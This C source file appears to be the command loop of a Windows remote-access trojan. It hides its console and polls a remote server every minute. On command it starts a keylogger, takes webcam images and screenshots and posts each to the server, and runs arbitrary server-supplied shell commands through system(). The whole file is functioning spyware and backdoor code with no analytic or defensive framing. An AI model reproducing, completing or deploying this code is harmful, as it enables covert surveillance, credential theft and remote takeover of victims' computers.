#include "Capture/webcam.h"
#include "Capture/screenshot.h"
#include "KeyLogger/logger.h"
#include "HTTP/http.h"
#include <stdio.h>
#include <process.h>
#include <string.h>
#pragma warning(disable:4996)
#define STACK_SIZE 16384
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
#define ONE_MIN 60000 // miliseconds
#define MAX_FILE_READ 262144 // 256 KB

HANDLE key_log_thread = { 0 };
BOOL key_log_running = FALSE; 
extern HHOOK hhk_low_level_hook;
extern HANDLE logger_file_handle;

int execute_commands(char commands[MAX_COMMANDS][MAX_COMMAND_LEN]) {
	int i = 0;
	unsigned int thread_id = 0;
	DWORD exit_code = 0;
	BOOL return_value = 0;
	char* bmp_capture = NULL;
	char* file_data = NULL;
	int result = 0;
	DWORD bytes_read = 0;

	while (strnlen(commands[i], MAX_COMMAND_LEN) && i < MAX_COMMANDS) {
		if (strncmp(commands[i], "start_keylogging", strlen("start_keylogging")) == 0 && !key_log_running) {
			key_log_thread = (HANDLE)_beginthreadex(NULL, STACK_SIZE,
				&start_logging, NULL, 0, &thread_id);
			key_log_running = TRUE;
		}
		else if (strncmp(commands[i], "send_keylogging", strlen("send_keylogging")) == 0) {
			file_data = (char*)malloc(MAX_FILE_READ);
			read_file(file_data, &bytes_read, MAX_FILE_READ);
			send_post_request_without_listening(file_data, bytes_read, "keylog_data",
				"text/plain");
			free(file_data);

		}
		else if (strncmp(commands[i], "stop_keylogging", strlen("stop_keylogging")) == 0 && key_log_running) {
			UnhookWindowsHookEx(hhk_low_level_hook);
			CloseHandle(logger_file_handle);
			GetExitCodeThread(key_log_thread, &exit_code);
			return_value = TerminateThread(key_log_thread, exit_code);
			if (return_value == 0) {
				printf("Closing key logging thread failed with error: %d", GetLastError());
				i++;
				continue;
			}
			key_log_running = FALSE;
			printf("stopped keylogging\n");
		}
		else if (strncmp(commands[i], "take_webcam_capture", strlen("take_webcam_capture")) == 0) {
			bmp_capture = (char*)malloc(get_webcam_capture_size() * sizeof(char));
			result = take_web_capture(&bmp_capture);
			if (result == 0)
				printf("Webcam is either not present or in use\n");
			else
				send_post_request_without_listening(bmp_capture, get_webcam_capture_size(),
					"webcam_capture", "image/bmp");
			free(bmp_capture);
		}
		else if (strncmp(commands[i], "take_screenshot", strlen("take_screenshot")) == 0) {
			bmp_capture = take_screen_capture();
			send_post_request_without_listening(bmp_capture, get_screen_capture_size(),
				"screenshot", "image/bmp");
			free(bmp_capture);
		}
		else if (strncmp(commands[i], "execute", strlen("execute")) == 0)
			system(commands[i] + strlen("execute"));
		else if (strncmp(commands[i], "stop_execution", strlen("stop_execution")) == 0)
			return 0;
		else if (strncmp(commands[i], "no_commands", strlen("no_commands")) == 0)
			return 1;
		else
			printf("Invalid command: %s\n", commands[i]);
		i++;
	}
	return 1;
}

int main() {
	HTTP_RESPONSE http_response = send_get_command("first_command");
	while (1) {
		if (!execute_commands(http_response.commands))
			break;
		Sleep(ONE_MIN);
		http_response = send_get_command("command");
	}
	return 1;
}